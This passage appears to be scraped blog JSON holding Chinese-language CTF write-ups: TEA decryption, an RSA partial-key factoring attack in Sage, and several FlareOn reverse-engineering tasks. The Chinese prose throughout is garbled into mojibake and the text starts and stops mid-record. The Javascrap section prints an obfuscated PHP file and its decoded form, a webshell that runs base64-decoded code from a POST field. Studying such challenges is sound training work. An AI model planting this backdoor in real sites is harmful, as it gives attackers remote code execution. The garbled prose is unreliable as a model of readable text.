çš„ç¬¬ä¸€éƒ¨åˆ†å¡«å†™é•¿åº¦ï¼Œç¬¬äºŒéƒ¨åˆ†å­˜ a2\nåˆå§‹åŒ–éƒ¨åˆ†åº”è¯¥å¯ä»¥å…ˆä¸ç®¡äº†ï¼Œå»çœ‹åŠ å¯†å‡½æ•°\nunsigned __int64 __fastcall sub_55A06D2CCB30(__int64 a1, __int64 a2, __int64 a3) { sub_55A06D2CCA13(v5, a1); sub_55A06D2CCA13(v6, (a1 + 36)); sub_55A06D2CC408(v7, 0); sub_55A06D2CC408(v8, 0x830A5376); sub_55A06D2CC408(v9, 0x1D3D2ACF); sub_55A06D2CC667(v10, v9, v8); // v10=delta=0x9e3779b9 sub_55A06D2CCA13(v11, a2); sub_55A06D2CCA13(v12, (a2 + 36)); sub_55A06D2CCA13(v13, (a2 + 72)); sub_55A06D2CCA13(v14, (a2 + 108)); v3 = 32; do { sub_55A06D2CC2E9(v7, v7, v10); // sum+=delta left_rot(v15, v6, 4); sub_55A06D2CC2E9(v15, v15, v11); // v15+v11 sub_55A06D2CC2E9(v16, v6, v7); // sum+plain right_rot(v17, v6, 5); sub_55A06D2CC2E9(v17, v17, v12); // key+plain sub_55A06D2CC667(v15, v15, v16); sub_55A06D2CC667(v15, v15, v17); sub_55A06D2CC2E9(v5, v5, v15); left_rot(v18, v5, 4); sub_55A06D2CC2E9(v18, v18, v13); sub_55A06D2CC2E9(v19, v5, v7); right_rot(v20, v5, 5); sub_55A06D2CC2E9(v20, v20, v14); sub_55A06D2CC667(v18, v18, v19); sub_55A06D2CC667(v18, v18, v20); sub_55A06D2CC2E9(v6, v6, v18); --v3; } while ( v3 ); sub_55A06D2CCA13(a1, v5); sub_55A06D2CCA13((a1 + 36), v6); return __readfsqword(0x28u) ^ v21; } ä¸€å¼€å§‹çœ‹åˆ°ä¸€å¤§ä¸² sub_ è¿˜ä»¥ä¸ºæ˜¯ AES ä¹‹ç±»çš„ï¼ˆæ¯•ç«Ÿä¹‹å‰åšè¿‡ä¸€é“ç±»ä¼¼çš„ï¼‰ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹é‡è¦çš„å‚æ•°\n64bitæ˜æ–‡ï¼Œ128bitå¯†é’¥ï¼Œ32è½®åŠ å¯†\nçœ‹èµ·æ¥å¾ˆåƒteaå®¶æ—çš„ç®—æ³•ï¼Œä½†ä¸æ˜¯å¾ˆç¡®å®šã€‚å› ä¸ºæ‡’å¾—è¯¦ç»†çœ‹æ¯ä¸ªå‡½æ•°äº†ï¼Œæ‰€ä»¥åŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œåšä¸ªé»‘ç›’æµ‹è¯•\nè°ƒè¯•ä¹‹åå‘ç° 0x830A5376 å’Œ 0x1D3D2ACF å…¶å®æ˜¯ç”¨æ¥ç®— delta çš„ï¼Œç®—å‡ºæ¥ v10=0x9e3779b9ï¼Œè¿™å°±è‚¯å®šæ˜¯teaå®¶æ—äº†\nå¦å¤–ï¼ŒåŠ¨è°ƒçš„æ—¶å€™å‘ç°è¿™é‡Œåº”è¯¥éƒ½æ˜¯ç”¨çš„ç»“æ„ä½“ï¼Œæ‰€ä»¥æ¯ä¸ªå°çš„åŠ æ³•éƒ½æ˜¯å•ç‹¬çš„å‡½æ•°ç»™å‡ºçš„ï¼Œä½†å¥½åƒç”¨ä¸Šçš„åªæœ‰ç»“æ„ä½“çš„å‰å…«ä¸ªå­—èŠ‚ï¼Œåé¢çš„å­—èŠ‚æœ‰ä»€ä¹ˆç”¨è¿˜ä¸å¤ªæ¸…æ¥š\nç„¶åå…·ä½“å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°å¾ªç¯ä¸­çš„å‰å‡ ä¸ªåˆ†åˆ«æ˜¯ sum+=deltaï¼Œv6\u0026lt;\u0026lt;4ï¼Œ(v6\u0026lt;\u0026lt;4)+k0ï¼Œsum+p0ï¼Œv6\u0026gt;\u0026gt;5ï¼Œk1+p0ã€‚å’Œç½‘ä¸Šçš„ä¸‰ç§ TEA åŠ å¯†æ¯”å¯¹äº†ä¸€ä¸‹ï¼Œå‘ç°ç«Ÿç„¶å°±æ˜¯æœ€ç®€å•çš„ TEA åŠ å¯†ï¼Œä¸€å¼€å§‹çœ‹è¿™ä¹ˆå¤šå‡½æ•°è¿˜ä»¥ä¸ºæ˜¯ XTEA å‘¢\nè„šæœ¬ å¯†é’¥å°±æ˜¯ä¸»å‡½æ•°ä¸­åˆå§‹åŒ–çš„å‡ ä¸ª 0x11ï¼Œå¯†æ–‡å°±æ˜¯æœ€åç”¨æ¥ cmp çš„å­—ç¬¦ä¸²ï¼ˆæ‰¾ç»“æ„ä½“å¯¹åº”çš„é‚£ä¸ªå­—ç¬¦æ•°ç»„å°±è¡Œï¼‰ï¼Œäºæ˜¯æ‰¾äº†ä¸ªè„šæœ¬ï¼Œç›´æ¥è§£å¯†\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void decrypt(uint32_t* v, uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; uint32_t delta = 0x9e3779b9; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + k2) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k3); v0 -= ((v1 \u0026lt;\u0026lt; 4) + k0) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k1); sum -= delta; } v[0] = v0; v[1] = v1; } int main() { uint32_t v[2] = {0x79AE1A3B, 0X596080D3}, k[4] = {17, 17, 17, 17}; decrypt(v, k); printf(\u0026#34;%X%X\u0026#34;, v[0], v[1]); } æŠŠæ‰€æœ‰å¯†æ–‡å…¨æ‰”è¿›å»ç®—ç»“æœï¼Œå°±èƒ½æ‹¿åˆ° flag äº†\næ€»ç»“ ç¬¬ä¸€çœ¼çœ‹åˆ°è¿™ä¸ªé¢˜å°±æ„Ÿè§‰èƒ½åšå‡ºæ¥ï¼Œæœç„¶å¦‚æ­¤\næ·±åˆ»ä½“ä¼šåˆ°äº†åŠ¨è°ƒè¿›è¡Œé»‘ç›’æµ‹è¯•çš„é‡è¦æ€§ï¼Œå¯ä»¥å¤§å¹…åº¦åŠ å¿«åšé¢˜é€Ÿåº¦ï¼Œèƒ½çŒœå‡ºæ¥å°±ä¸è¦èŠ±æ—¶é—´çœ‹\nå…¶å®è¿™é¢˜æœ‰ç‚¹å¯æƒœï¼Œæœ¬æ¥èƒ½æŠ¢åˆ°ä¸‰è¡€çš„ï¼Œç»“æœå¿˜äº†å¤§å°å†™çš„é—®é¢˜ï¼Œè„šæœ¬ç®—å‡ºæ¥åæœ¬åœ°æµ‹è¯•ä¸€ç›´æ˜¯ errorï¼Œæœ€åè¿˜æ˜¯å¤§ä½¬é˜Ÿå‹å‘ç°çš„ï¼Œç„¶åå°±è¿‡äº†\n","date":"2021-05-10T02:32:59Z","permalink":"/post/jinmen-cup-goodre-writeup/","title":"æ´¥é—¨æ¯ GoodRE writeup"},{"content":"å·²çŸ¥ä¸€ä¸ª $1024$ ä½çš„ $p1$ï¼Œ$p2$ æ¯” $p1$ ç¨å°ï¼Œæ ¹æ®ä»£ç çŸ¥é“ $p3\\equiv p2!\\pmod{p1}$\næ ¹æ® Wilson å®šç†ï¼Œ$n$ ä¸ºè´¨æ•°æ—¶æœ‰ $(n-1)!\\equiv -1\\pmod{n}$ï¼Œæ‰€ä»¥ $p2! \\prod\\limits_{i=p2+1}^{p1-2}i\\equiv 1\\pmod{p1}$ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®—å‡º $p2+1$ ä¹˜åˆ° $p1-1$ çš„ç»“æœï¼Œç„¶åå–æ¨¡æ‹Ÿå¹¶è°ƒç”¨ sympy åº“å³å¯å¾—åˆ° $p3$\nimport sympy from libnum import invmod p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031 p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034 res = 1 for i in range(p2 + 1, p1 - 1): res = res * i % p1 res = invmod(res, p1) p3 = sympy.nextprime(res) p = p3 \u0026gt;\u0026gt; 50 \u0026lt;\u0026lt; 50 å¾—åˆ°çš„ $p$ æ˜¯æœ€ç»ˆ RSA åŠ å¯†ç”¨çš„ $P$ çš„é«˜ä½ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ Factoring with High Bits Known æ”»å‡»ï¼Œç”¨ sage æ„é€ å¦‚ä¸‹æ”»å‡»è„šæœ¬ï¼ˆç½‘ä¸Šæ‰¾çš„ï¼‰\np = 0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722c000000000000 N = 0xe27e847b1cece6ad3d8a35c27022d94cc14016f9550d41b87b85f946edf0a1c01d8c79a663244143550cfce88038bf29d65070d021991455e4570ea57ea1effc1cf380d572473dc6ea0dc150c431761181e66c578eaeebf156c445d3b6141dda961aa467f4d2c811859534027e5b9e67eb4db051c82602208cfe92674013aafa5b437ae404876ececc2f453bb16734adccc5fb87b16e980e52484f6b9f4bdeb99f2e7dc606bb65628e3f62c7df11abd553ffc6b95d3dda592fa81df5e584687864de702d10669e3aac75ad9c6284b98b44140f347307243b2485f59fa5c3f0eaeaf0addade803f2f09cd4c77f27d672756b9cc62a6325247d8608390e761dc91 pbits = p.nbits() kbits = 50 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) f = x + p x0 = f.small_roots(X=2^kbits, beta=0.4)[0] print( \u0026#34;x: %s\u0026#34; %hex(int(x0))) p = p+x0 print (\u0026#34;p: \u0026#34;, hex(int(p))) assert N % p == 0 q = N/int(p) print (\u0026#34;q: \u0026#34;, hex(int(q))) å¾—åˆ° RSA çš„ $P$ å’Œ $Q$ï¼Œæœ€ç»ˆæ„å»ºè§£å¯†è„šæœ¬\nfrom libnum import invmod, n2s p = 0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722fbcdcffc1a2ef q = 0xfced19c7532be88658aaa5e9566f5274b9aefa4c5d21582a24cc48c70b5e3c05c17eb6f85b4732d57bdc0288d1f548b92f4f13a6f7b07d07a01173cefb06fb8f2e3591e5d518d1584a8e27331a4e769eae98537fe1fb380ee804574d98188a4c327c8a1d180ee44b9148d63a07216b40e711970c9f1ea097bfbecfc3b52e787f phi_n = (p - 1) * (q - 1) print (n2s(c, invmod(e, phi_n), N)) # flag{w0_x1hu1n_y0u_b5st} ","date":"2021-04-13T21:39:43Z","permalink":"/post/hmg2021-rsa-attack-writeup/","title":"hmg2021 RSA Attack writeup"},{"content":"Chanllenge1 ä¸€ä¸ªä¿®æ”¹äº† table çš„ Base64\nimport base64 import string fake_base = \u0026#39;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\u0026#39; true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; cipher = \u0026#39;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\u0026#39; good_cipher = \u0026#39;\u0026#39; for c in cipher: good_cipher += true_base[fake_base.index(c)] print (good_cipher) print (base64.b64decode(good_cipher)) Bob Doge å…ˆè¿è¡Œæµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ç‚¹å‡» Decode ä¹‹åæ˜¯ä¹±ç \nç”¨ dnSpy æ‰“å¼€ï¼Œæ‰¾åˆ° Main å‡½æ•°\nprivate static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new Form1()); } å‘ç°åªæ–°å»ºäº†ä¸€ä¸ª Form1\nè¿›å…¥ Form1ï¼Œæ‰¾åˆ°å¸¦æœ‰ Click çš„å‡½æ•°\nprivate void btnDecode_Click(object sender, EventArgs e) { this.pbRoge.Image = Resources.bob_roge; byte[] dat_secret = Resources.dat_secret; string text = \u0026#34;\u0026#34;; foreach (byte b in dat_secret) { text += (char)((b \u0026gt;\u0026gt; 4 | ((int)b \u0026lt;\u0026lt; 4 \u0026amp; 240)) ^ 41); } text += \u0026#34;\\0\u0026#34;; string text2 = \u0026#34;\u0026#34;; for (int j = 0; j \u0026lt; text.Length; j += 2) { text2 += text[j + 1]; text2 += text[j]; } string text3 = \u0026#34;\u0026#34;; for (int k = 0; k \u0026lt; text2.Length; k++) { char c = text2[k]; text3 += (char)((byte)text2[k] ^ 102); } this.lbl_title.Text = text3; } å‘ç°æ˜¯ä»ä¸€ä¸ª Resources çš„åœ°æ–¹è°ƒç”¨æ¥äº†ä¸€ä¸ª dat_secretã€‚ä½†æ‰¾ä¸åˆ°è¿™ä¸ªåœ°æ–¹ã€‚\näºæ˜¯è€ƒè™‘è¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚\næ‰“ä¸Šæ–­ç‚¹åè°ƒè¯•ï¼Œç‚¹å‡» Decode æŒ‰é’®ï¼Œè¿›å…¥å¦‚ä¸‹é¡µé¢\nflag ä¸€å¼€å§‹ä»¥ä¸ºæœ€åçš„ text3 æ˜¯ flagï¼Œç»“æœçœ‹åˆ° text å˜é‡é•¿å¾—å°±å¾ˆå¥½çœ‹ï¼Œç¬¦åˆ FlareOn çš„ flag çš„ç‰¹å¾ï¼Œäºæ˜¯ç›´æ¥æäº¤è¯•è¯•ï¼Œå‘ç°é€šè¿‡ã€‚\nUltimateMinesweeper è¿è¡Œè½¯ä»¶æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ª $30\\times 30$ çš„æ‰«é›·ï¼Œåªæœ‰ä¸‰ä¸ªæ ¼å­ä¸æ˜¯é›·ã€‚\nexeinfoå‘ç°æ˜¯ .NET æ–‡ä»¶ï¼Œå› æ­¤æ‹–åˆ° dnSpy ä¸­\nç”±äºæ˜¯é¢å‘å¯¹è±¡ä»£ç ï¼Œä¸å¤ªå¥½åˆ†æï¼Œæ‰€ä»¥è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œåœ¨ç”Ÿæˆå®Œæ‰«é›·ç•Œé¢ååœä¸‹ï¼ŒæŸ¥çœ‹å†…å­˜æ•°æ®ï¼Œå‘ç°åœ¨ mineField.MinesPresent ä¸­å­˜æœ‰é›·çš„ä½ç½®ã€‚\nmineinmemory å…ˆå°è¯•ç›´æ¥æ‰‹åŠ¨æŠŠé›·æ‰”åˆ°å‰ä¸‰ä¸ªï¼Œç„¶åè¿è¡Œè¯•ä¸€ä¸‹ï¼Œå‘ç°ï¼š\näºŒå…ƒæ•°ç»„æ˜¯å…ˆç«–åæ¨ª æœ€åå‡ºç°çš„ç»“æœæ˜¯ä¹±ç  å› æ­¤ç®€å•çœ‹ä¸€ä¸‹æœ€åçš„ç”Ÿæˆå‡½æ•°\nå¯»æ‰¾ SuccessPopup çš„è°ƒç”¨\nå‘ç° new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();\nå› æ­¤æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•\nprivate string GetKey(List\u0026lt;uint\u0026gt; revealedCells) { revealedCells.Sort(); Random random = new Random(Convert.ToInt32(revealedCells[0] \u0026lt;\u0026lt; 20 | revealedCells[1] \u0026lt;\u0026lt; 10 | revealedCells[2])); byte[] array = new byte[32]; byte[] array2 = new byte[] { 245, 75, 65, 142, 68, 71, 100, 185, 74, 127, 62, 130, 231, 129, 254, 243, 28, 58, 103, 179, 60, 91, 195, 215, 102, 145, 154, 27, 57, 231, 241, 86 }; random.NextBytes(array); uint num = 0U; while ((ulong)num \u0026lt; (ulong)((long)array2.Length)) { byte[] array3 = array2; uint num2 = num; array3[(int)num2] = (array3[(int)num2] ^ array[(int)num]); num += 1U; } return Encoding.ASCII.GetString(array2); } ä¼¼ä¹æœ€åçš„ç»“æœå’Œæ‰«é›·æ—¶ç‚¹å‡»çš„ä½ç½®ä¹Ÿæœ‰å…³ç³»ï¼Œæ‰€ä»¥ä¸èƒ½æ‰‹åŠ¨ä¿®æ”¹é›·çš„ä½ç½®\né‚£å°±æ‰¾åˆ°ä¸‰ä¸ª False å¹¶è®°å½•ä¸‹æ¥å³å¯\n7 20 28 7 24 28 è¿è¡Œå¹¶ç‚¹å‡»è¿™ä¸‰ä¸ªä½ç½®\nwhereismine æœ€åå¼¹å‡º flag\nthisisflag [FlareOn1]Javascrap ä¸€å¼€å§‹ç›¯ç€ç½‘é¡µçœ‹äº†åŠå¤©ï¼Œæ‰¾ä¸åˆ°é¢˜ç›®åœ¨å“ªå„¿ï¼Œå°±çœ‹äº†çœ¼åˆ«äººçš„wpï¼Œå‘ç°æ–‡ä»¶å°±åœ¨å›¾ç‰‡é‡Œ\nç”¨010editoræ‰“å¼€ï¼Œæ‰¾åˆ°phpæ–‡ä»¶ï¼Œå¯¼å‡º\n\u0026lt;?php $terms=array(\u0026#34;M\u0026#34;, \u0026#34;Z\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;w\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;v\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;Q\u0026#34;, \u0026#34;z\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;s\u0026#34;, \u0026#34;m\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;W\u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;y\u0026#34;, \u0026#34;T\u0026#34;, \u0026#34;V\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;S\u0026#34;, \u0026#34;X\u0026#34;, \u0026#34;)\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;P\u0026#34;, \u0026#34;r\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;\\\u0026#39;\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;~\u0026#34;, \u0026#34;O\u0026#34;, \u0026#34;h\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;U\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;H\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;N\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;0\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;J\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;k\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;Y\u0026#34;, \u0026#34;(\u0026#34;, \u0026#34;j\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;t\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;|\u0026#34;); $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47); $do_me=\u0026#34;\u0026#34;; for($i=0;$i\u0026lt;count($order);$i++){ $do_me=$do_me.$terms[$order[$i]]; } eval($do_me); ?\u0026gt; ç”¨å›½èµ›å­¦æ¥çš„æ–¹æ³•ï¼Œç›´æ¥æŠŠ eval æ”¹æˆ print ç„¶åæ”¾åœ¨çº¿ç¯å¢ƒè¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°ç¬¬äºŒä»½è„šæœ¬\n$_= \\\u0026#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\\\u0026#39;; $__=\\\u0026#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\\\u0026#39;; $___=\u0026#34;\\x62\\141\\x73\\145\\x36\\64\\x5f\\144\\x65\\143\\x6f\\144\\x65\u0026#34;; eval($___($__)); è¿™æ¬¡å¥½åƒåœ¨çº¿ç¯å¢ƒè¿è¡Œä¸äº†ï¼Œçœ‹ä¸€ä¸‹å­—ç¬¦ä¸²éƒ½æ˜¯ä»€ä¹ˆï¼Œå¤åˆ¶åˆ°pythoné‡Œï¼Œå‘ç° $___ æ˜¯ base64_decode\näºæ˜¯æŠŠ $__ è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°\n$code=base64_decode($_);eval($code); æ‰€ä»¥åªè¦è§£ç  $_ å°±å¯ä»¥äº†ï¼Œå¾—åˆ°\nif(isset($_POST[\u0026#34;\\\\97\\\\49\\\\49\\\\68\\\\x4F\\\\84\\\\116\\\\x68\\\\97\\\\x74\\\\x44\\\\x4F\\\\x54\\\\x6A\\\\97\\\\x76\\\\x61\\\\x35\\\\x63\\\\x72\\\\97\\\\x70\\\\x41\\\\84\\\\x66\\\\x6C\\\\97\\\\x72\\\\x65\\\\x44\\\\65\\\\x53\\\\72\\\\111\\\\110\\\\68\\\\79\\\\84\\\\99\\\\x6F\\\\x6D\u0026#34;])) { eval(base64_decode($_POST[\u0026#34;\\\\97\\\\49\\\\x31\\\\68\\\\x4F\\\\x54\\\\116\\\\104\\\\x61\\\\116\\\\x44\\\\79\\\\x54\\\\106\\\\97\\\\118\\\\97\\\\53\\\\x63\\\\114\\\\x61\\\\x70\\\\65\\\\84\\\\102\\\\x6C\\\\x61\\\\114\\\\101\\\\x44\\\\65\\\\x53\\\\72\\\\111\\\\x6E\\\\x44\\\\x4F\\\\84\\\\99\\\\x6F\\\\x6D\u0026#34;])); } POSTè¯·æ±‚æ˜¯ä»€ä¹ˆä¸å¤ªæ¸…æ¥šï¼Œä½†çœ‹åˆ°è¿™äº›å­—ç¬¦å¥½åƒéƒ½åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…ï¼Œæ‰€ä»¥ç›´æ¥è½¬æˆstringï¼Œå¾—åˆ°\nb\u0026#39;a11DOTthatDOTjava5crapATflareDASHonDOTcom\u0026#39; æŠŠ DOTï¼ŒATï¼ŒDASH éƒ½è½¬æˆå¯¹åº”çš„ç¬¦å·ï¼Œå°±æ‹¿åˆ°flagäº†\n[FlareOn4]greek_to_me å°è¯•è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°ä¸èƒ½è¾“å…¥\né€†å‘ï¼Œå‘ç°127.0.0.1çš„å­—æ ·ï¼Œä»¥åŠsocketç­‰æ˜æ˜¾çš„ç½‘ç»œé€šä¿¡å‡½æ•°\nç›´æ¥è¿è¡Œçš„æ—¶å€™çœ‹ä¸€ä¸‹ä¸»æœºç«¯å£ï¼Œå‘ç°æ˜¯ 127.0.0.1:2222ï¼Œç”¨Windowsä¸‹çš„ncè¿ä¸Šå»å°±å¯ä»¥è¿›è¡Œè°ƒè¯•äº†\nSMCè¿˜æ˜¯å¾ˆæ˜æ˜¾çš„\nå‘ç°è§£SMCæ—¶ä»…ç”¨äº†ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä½†ç”±äºä¸çŸ¥é“é‡Œé¢æœ‰ä»€ä¹ˆï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å¯¹åé¢çš„å­—èŠ‚è¿›è¡ŒéªŒè¯ï¼Œæ‰€ä»¥å†³å®šå°†ç¨‹åºæœ¬åœ°å¤ç°ä¸€ä¸‹ï¼Œçˆ†ç ´è§£SMCçš„å¯†é’¥\n#include \u0026lt;stdio.h\u0026gt; unsigned char ida_chars[] = { 0x33, 0xE1, 0xC4, 0x99, 0x11, 0x06, 0x81, 0x16, 0xF0, 0x32, 0x9F, 0xC4, 0x91, 0x17, 0x06, 